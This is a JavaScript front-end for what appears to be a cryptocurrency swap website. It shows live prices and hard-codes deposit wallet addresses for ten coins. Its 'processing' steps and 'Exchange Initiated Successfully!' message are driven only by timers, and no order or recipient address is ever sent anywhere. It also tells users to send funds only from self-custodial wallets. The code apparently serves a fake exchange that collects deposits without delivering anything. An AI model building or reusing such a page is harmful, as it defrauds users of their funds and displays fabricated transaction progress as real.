// Map dropdown labels to CoinGecko IDs
const coinMap = {
  "Bitcoin(BTC)": "bitcoin",
  "Monero(XMR)": "monero",
  "Litecoin(LTC)": "litecoin",
  "Etherium(ETH)": "ethereum",
  "USDT(Trc20)": "tether",
  "Solana(SOL)": "solana",
  "Tron(TRX)": "tron",
  "XRP": "ripple",
  "Dogecoin(DOGE)": "dogecoin",
  "Cardano(ADA)": "cardano"
};

// List of supported wallet addresses (sender addresses - where users send crypto TO)
const senderWalletAddresses = {
    "Bitcoin(BTC)": "bc1qdfcpzlgdqj4uta4s4rns4x7jxgl68vw9h3tl2d",
    "Etherium(ETH)": "0x88caA1E8806fC244d48576D038Dc0131806c60d7",
    "Litecoin(LTC)": "ltc1qanq0selnp49nqnx6jw6rhuretn32mgcp4p3fmn",
    "Monero(XMR)": "4B2P5hXCYx7amU1KYun27thzbJx7hUBAEVvmmuZjQ17B2u13MsonoBLbmMZrvSGV3ENBDtGxJhVRt8TmZh6hS2xXVHLMHpE",
    "Solana(SOL)": "71cy4Bc3wTi5PL99ugNRGcBuT1nmCZyT1A2j4hFfGu3d",
    "Tron(TRX)": "TBS7ZtrrEwARnXFDMbhxJyLBk9ncUSEPMY",
    "XRP": "rwVnoiMym6a8TZMRVA3MgUtK2PeNF5bM2E",
    "USDT(Trc20)": "TBS7ZtrrEwARnXFDMbhxJyLBk9ncUSEPMY",
    "Dogecoin(DOGE)": "DLS2AWnKWbkTuDf9LwDycrBfn6i32cY3TS",
    "Cardano(ADA)": "addr1qx7p0uyzyrfpkdz024nhtck3a4qsrxw295uksl3nu5g32dvhm3cy6hj43gkku8r9duhhm3rdnvayp82klgmdr2vyc8lqmz5tdx"
};

// Get elements
const sendAmountEl = document.querySelector(".send-optn input");
const sendAssetEl = document.querySelector(".send-optn select");
const receiveAmountEl = document.querySelector(".receive-optn input");
const receiveAssetEl = document.querySelector(".receive-optn select");
const recipientAddressEl = document.querySelector(".swap-optn input[type='text']");
const refundAddressEl = document.querySelector(".refund-optn input");
const exchangeBtn = document.getElementById("exchange-btn");

// Create price labels under selects
const sendPriceLabel = document.createElement("p");
sendPriceLabel.style.fontSize = "0.9em";
sendPriceLabel.style.color = "#F2F3F4";
sendAssetEl.insertAdjacentElement("afterend", sendPriceLabel);

const receivePriceLabel = document.createElement("p");
receivePriceLabel.style.fontSize = "0.9em";
receivePriceLabel.style.color = "#F2F3F4";
receiveAssetEl.insertAdjacentElement("afterend", receivePriceLabel);

// Create order processing modal
const orderModal = document.createElement("div");
orderModal.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    font-family: Arial, sans-serif;
`;
orderModal.innerHTML = `
    <div style="background: white; padding: 30px; border-radius: 12px; max-width: 500px; width: 90%; max-height: 90vh; overflow-y: auto;">
        <div id="modal-content"></div>
        <button id="close-modal" style="margin-top: 20px; padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%;">Close</button>
    </div>
`;
document.body.appendChild(orderModal);

// Create notification system
const notificationSystem = document.createElement("div");
notificationSystem.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 1001;
    max-width: 300px;
`;
document.body.appendChild(notificationSystem);

// Function to show notification
function showNotification(message, type = "info") {
    const notification = document.createElement("div");
    const bgColor = type === "error" ? "#f44336" : type === "success" ? "#4CAF50" : "#2196F3";
    
    notification.style.cssText = `
        background: ${bgColor};
        color: white;
        padding: 15px;
        margin: 10px 0;
        border-radius: 5px;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        animation: slideIn 0.3s ease;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <span>${message}</span>
            <button onclick="this.parentElement.parentElement.remove()" style="background: none; border: none; color: white; font-size: 16px; cursor: pointer;">×</button>
        </div>
    `;
    
    notificationSystem.appendChild(notification);
    
    setTimeout(() => {
        if (notification.parentElement) {
            notification.style.animation = "slideOut 0.3s ease";
            setTimeout(() => notification.remove(), 300);
        }
    }, 5000);
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
    .processing-spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #4CAF50;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 2s linear infinite;
        margin: 20px auto;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .order-step {
        margin: 15px 0;
        padding: 10px;
        border-left: 3px solid #4CAF50;
        background: #f9f9f9;
    }
    .order-step.active {
        background: #e8f5e8;
        border-left-color: #2E7D32;
    }
    .address-display {
        background: #f8f9fa;
        padding: 15px;
        border: 1px solid #ddd;
        border-radius: 8px;
        font-family: monospace;
        word-break: break-all;
        font-size: 14px;
        margin: 15px 0;
    }
`;
document.head.appendChild(style);

// Function to hide parts of wallet address for security
function hideWalletAddress(address) {
    if (!address) return '';
    
    if (address.length <= 20) {
        return address;
    }
    
    const visibleStart = Math.min(10, Math.floor(address.length * 0.3));
    const visibleEnd = Math.min(10, Math.floor(address.length * 0.3));
    
    const start = address.substring(0, visibleStart);
    const middle = '...';
    const end = address.substring(address.length - visibleEnd);
    
    return start + middle + end;
}

// Build API query
const allCoinIds = Object.values(coinMap).join(",");

async function fetchPrices() {
  const url = `https://api.coingecko.com/api/v3/simple/price?ids=${allCoinIds}&vs_currencies=usd`;
  const res = await fetch(url);
  return res.json();
}

async function updateConversion() {
  const sendAmount = parseFloat(sendAmountEl.value) || 0;
  const sendAssetName = sendAssetEl.options[sendAssetEl.selectedIndex].text;
  const receiveAssetName = receiveAssetEl.options[receiveAssetEl.selectedIndex].text;

  const sendId = coinMap[sendAssetName];
  const receiveId = coinMap[receiveAssetName];

  if (!sendId || !receiveId) return;

  try {
    const prices = await fetchPrices();
    const sendPriceUSD = prices[sendId]?.usd;
    const receivePriceUSD = prices[receiveId]?.usd;

    if (sendPriceUSD) {
      sendPriceLabel.textContent = `1 ${sendAssetName} ≈ $${sendPriceUSD.toLocaleString()}`;
    }
    if (receivePriceUSD) {
      receivePriceLabel.textContent = `1 ${receiveAssetName} ≈ $${receivePriceUSD.toLocaleString()}`;
    }

    if (sendPriceUSD && receivePriceUSD) {
      const receiveAmount = (sendAmount * sendPriceUSD) / receivePriceUSD;
      receiveAmountEl.value = receiveAmount.toFixed(6);
    }
  } catch (err) {
    console.error("Error fetching prices:", err);
  }
}

// Function to show modal
function showModal(content) {
    document.getElementById("modal-content").innerHTML = content;
    orderModal.style.display = "flex";
}

// Function to hide modal
function hideModal() {
    orderModal.style.display = "none";
}

// Function to validate exchange
function validateExchange() {
    const sendAmount = parseFloat(sendAmountEl.value);
    const recipientAddress = recipientAddressEl.value.trim();
    const sendAssetName = sendAssetEl.options[sendAssetEl.selectedIndex].text;
    const receiveAssetName = receiveAssetEl.options[receiveAssetEl.selectedIndex].text;
    
    if (!sendAmount || sendAmount <= 0) {
        showNotification("Please enter a valid amount to send", "error");
        return false;
    }
    
    if (!recipientAddress) {
        showNotification("Please enter your recipient address where you want to receive the funds", "error");
        return false;
    }
    
    if (sendAssetName === receiveAssetName) {
        showNotification("Cannot exchange the same cryptocurrency. Please select different assets.", "error");
        return false;
    }
    
    if (recipientAddress.length < 10) {
        showNotification("Please enter a valid recipient address", "error");
        return false;
    }
    
    return true;
}

// Function to show order confirmation
function showOrderConfirmation(exchangeData) {
    const { sendAmount, sendAsset, receiveAmount, receiveAsset, recipientAddress, refundAddress, senderAddress } = exchangeData;
    
    const content = `
        <h2 style="color: #2c5aa0; margin-bottom: 20px;">Confirm Your Exchange</h2>
        
        <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
            <h3 style="margin-top: 0; color: #2c5aa0;">Exchange Details</h3>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                <div>
                    <h4 style="margin: 0 0 10px 0; color: #d32f2f;">YOU SEND</h4>
                    <p style="margin: 5px 0;"><strong>Amount:</strong> ${sendAmount} ${sendAsset}</p>
                    <p style="margin: 5px 0;"><strong>Send to:</strong><br><small>${hideWalletAddress(senderAddress)}</small></p>
                </div>
                
                <div>
                    <h4 style="margin: 0 0 10px 0; color: #2E7D32;">YOU RECEIVE</h4>
                    <p style="margin: 5px 0;"><strong>Amount:</strong> ${receiveAmount} ${receiveAsset}</p>
                    <p style="margin: 5px 0;"><strong>Receive at:</strong><br><small>${hideWalletAddress(recipientAddress)}</small></p>
                </div>
            </div>
            
            ${refundAddress ? `<p style="margin: 10px 0;"><strong>Refund address:</strong><br><small>${hideWalletAddress(refundAddress)}</small></p>` : ''}
        </div>
        
        <div style="background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">Important Instructions</h4>
            <ol style="margin: 0; padding-left: 20px;">
                <li>Send exactly <strong>${sendAmount} ${sendAsset}</strong> to the address provided</li>
                <li>Do not send from exchange wallets (Coinbase, Binance, etc.)</li>
                <li>Use only self-custodial wallets (Trust Wallet, MetaMask, Exodus, etc.)</li>
                <li>Transaction will be processed after 1 network confirmation</li>
            </ol>
        </div>
        
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <button id="confirm-exchange" style="flex: 1; padding: 12px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">Confirm Exchange</button>
            <button id="cancel-exchange" style="flex: 1; padding: 12px; background: #f44336; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">Cancel</button>
        </div>
    `;
    
    showModal(content);
    
    document.getElementById("confirm-exchange").addEventListener("click", () => {
        processExchange(exchangeData);
    });
    
    document.getElementById("cancel-exchange").addEventListener("click", hideModal);
}

// Function to process exchange
function processExchange(exchangeData) {
    const { sendAmount, sendAsset, receiveAmount, receiveAsset, recipientAddress, senderAddress } = exchangeData;
    
    // Show processing screen
    const processingContent = `
        <h2 style="color: #2c5aa0; margin-bottom: 20px; text-align: center;">Processing Your Exchange</h2>
        
        <div class="processing-spinner"></div>
        
        <div class="order-step active">
            <strong>Step 1: Order Confirmed</strong>
            <p style="margin: 5px 0; font-size: 14px;">Your exchange request has been received</p>
        </div>
        
        <div class="order-step">
            <strong>Step 2: Awaiting Deposit</strong>
            <p style="margin: 5px 0; font-size: 14px;">Waiting for your ${sendAsset} deposit</p>
        </div>
        
        <div class="order-step">
            <strong>Step 3: Processing</strong>
            <p style="margin: 5px 0; font-size: 14px;">Converting your funds</p>
        </div>
        
        <div class="order-step">
            <strong>Step 4: Complete</strong>
            <p style="margin: 5px 0; font-size: 14px;">Sending ${receiveAsset} to your wallet</p>
        </div>
        
        <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; margin-top: 20px;">
            <h4 style="margin-top: 0; color: #2E7D32;">Next Steps</h4>
            <p style="margin: 10px 0;"><strong>Send exactly ${sendAmount} ${sendAsset} to:</strong></p>
            <div class="address-display">
                ${senderAddress}
            </div>
            <button id="copy-final-address" style="margin-top: 10px; padding: 8px 15px; background: #2196F3; color: white; border: none; border-radius: 4px; cursor: pointer; width: 100%;">Copy Address</button>
        </div>
    `;
    
    showModal(processingContent);
    
    document.getElementById("copy-final-address").addEventListener("click", function() {
        navigator.clipboard.writeText(senderAddress).then(() => {
            this.textContent = "Address Copied!";
            this.style.background = "#1976D2";
            setTimeout(() => {
                this.textContent = "Copy Address";
                this.style.background = "#2196F3";
            }, 2000);
        });
    });
    
    // Simulate processing steps
    setTimeout(() => {
        document.querySelectorAll('.order-step')[1].classList.add('active');
    }, 2000);
    
    setTimeout(() => {
        document.querySelectorAll('.order-step')[2].classList.add('active');
    }, 4000);
    
    setTimeout(() => {
        document.querySelectorAll('.order-step')[3].classList.add('active');
        
        // Show completion message
        setTimeout(() => {
            const completionContent = `
                <div style="text-align: center; padding: 20px;">
                    <div style="font-size: 48px; color: #4CAF50; margin-bottom: 20px;">✓</div>
                    <h2 style="color: #2E7D32; margin-bottom: 15px;">Exchange Initiated Successfully!</h2>
                    <p>Your exchange has been queued for processing.</p>
                    
                    <div style="background: #e8f5e8; padding: 15px; border-radius: 8px; margin: 20px 0;">
                        <p><strong>Send exactly ${sendAmount} ${sendAsset} to:</strong></p>
                        <div class="address-display">
                            ${senderAddress}
                        </div>
                        <button id="copy-completion-address" style="margin-top: 10px; padding: 8px 15px; background: #2196F3; color: white; border: none; border-radius: 4px; cursor: pointer; width: 100%;">Copy Address</button>
                        <p style="font-size: 14px; color: #666; margin-top: 10px;">Funds will be sent to your ${receiveAsset} address after confirmation.</p>
                    </div>
                    
                    <p style="font-size: 14px; color: #666;">You can close this window. We'll process your exchange once we receive your deposit.</p>
                </div>
            `;
            
            showModal(completionContent);
            showNotification("Exchange initiated successfully! Please send your funds to complete the transaction.", "success");
            
            document.getElementById("copy-completion-address").addEventListener("click", function() {
                navigator.clipboard.writeText(senderAddress).then(() => {
                    this.textContent = "Address Copied!";
                    this.style.background = "#1976D2";
                    setTimeout(() => {
                        this.textContent = "Copy Address";
                        this.style.background = "#2196F3";
                    }, 2000);
                });
            });
            
            // Reset form
            exchangeBtn.disabled = false;
            exchangeBtn.textContent = "EXCHANGE / SWAP";
            
        }, 1000);
    }, 2000);
}

// Function to handle exchange
function handleExchange() {
    if (!validateExchange()) {
        return;
    }
    
    const sendAmount = sendAmountEl.value;
    const sendAsset = sendAssetEl.options[sendAssetEl.selectedIndex].text;
    const receiveAmount = receiveAmountEl.value;
    const receiveAsset = receiveAssetEl.options[receiveAssetEl.selectedIndex].text;
    const recipientAddress = recipientAddressEl.value;
    const refundAddress = refundAddressEl.value;
    const senderAddress = senderWalletAddresses[sendAsset];
    
    const exchangeData = {
        sendAmount,
        sendAsset,
        receiveAmount,
        receiveAsset,
        recipientAddress,
        refundAddress,
        senderAddress,
        timestamp: new Date().toISOString()
    };
    
    // Disable exchange button during process
    exchangeBtn.disabled = true;
    exchangeBtn.textContent = "Processing...";
    
    showOrderConfirmation(exchangeData);
}

// Event listeners
sendAmountEl.addEventListener("input", updateConversion);
sendAssetEl.addEventListener("change", updateConversion);
receiveAssetEl.addEventListener("change", updateConversion);
exchangeBtn.addEventListener("click", handleExchange);

// Update recipient address placeholder based on selected receive asset
receiveAssetEl.addEventListener("change", function() {
    const receiveAssetName = this.options[this.selectedIndex].text;
    recipientAddressEl.placeholder = `Your ${receiveAssetName} address to receive funds`;
});

// Close modal event
document.getElementById("close-modal").addEventListener("click", hideModal);
orderModal.addEventListener("click", (e) => {
    if (e.target === orderModal) hideModal();
});

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    updateConversion();
    
    const initialReceiveAsset = receiveAssetEl.options[receiveAssetEl.selectedIndex].text;
    recipientAddressEl.placeholder = `Your ${initialReceiveAsset} address to receive funds`;
});

// Refresh prices every 5s
setInterval(updateConversion, 5000);